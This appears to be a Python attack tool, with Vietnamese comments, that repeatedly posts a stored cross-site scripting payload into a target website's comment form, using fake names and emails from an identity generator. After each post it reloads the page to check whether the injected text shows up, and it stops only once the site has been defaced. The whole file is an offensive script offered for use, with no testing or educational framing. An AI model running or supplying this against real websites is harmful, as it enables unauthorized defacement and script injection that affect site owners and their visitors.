import sys
import os
import time
import requests

# Chỉ đường cho Python tìm thư mục Core
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

try:
    from Core.identity_gen import gen_fake_identity
except ImportError:
    print("[!] Lỗi: Không tìm thấy Core/identity_gen.py")
    sys.exit(1)

def smart_attack(target_url):
    print(f"\n[🚀] CHẾ ĐỘ: SMART ATTACK - INJECTION & VERIFY")
    
    # 1. Nhập văn bản muốn "tiêm" để hiển thị
    a = input("[?] Nhập văn bản bạn muốn hiển thị trên web đối phương: ")
    print(f"[*] Đang chuẩn bị tiêm nội dung: '{a}'")
    print("-" * 45)

    while True:
        try:
            identity = gen_fake_identity()
            
            # 2. Tạo Payload tiêm vào HTML (XSS/Injection)
            # Thử tiêm vào các thẻ h1, p hoặc alert để kiểm tra
            payload = f"<script>document.body.innerHTML += '<h1>{a}</h1>';</script>"
            
            data = {
                "username": identity['name'],
                "comment": payload, # Giả lập tiêm vào phần bình luận hoặc nhập liệu
                "email": identity['email']
            }

            # 3. Thực hiện tiêm khi server xử lý dữ liệu
            print(f"[*] Đang gửi gói tin mang mã độc '{a}'...")
            requests.post(target_url, data=data, timeout=10)

            # 4. KIỂM TRA HTML (Verify)
            # Tải lại trang web để xem nội dung mình tiêm có xuất hiện trong code không
            check_response = requests.get(target_url, timeout=10)
            html_content = check_response.text

            if a in html_content:
                print(f"[🔥] THÀNH CÔNG!!! Đã tìm thấy văn bản '{a}' trong mã nguồn của web.")
                print("[!] Web này đã bị tiêm mã thành công (Vulnerable).")
                break # Dừng lại khi đã xác nhận thành công
            else:
                print(f"[...] Đang chờ server lag để lọt mã... (Chưa tìm thấy '{a}')")
            
            time.sleep(2)

        except requests.exceptions.RequestException as e:
            print(f"[!] Lỗi kết nối: {e}")
            break
        except KeyboardInterrupt:
            print("\n[!] Đã dừng quét.")
            break

if __name__ == "__main__":
    if len(sys.argv) > 1:
        smart_attack(sys.argv[1])
        
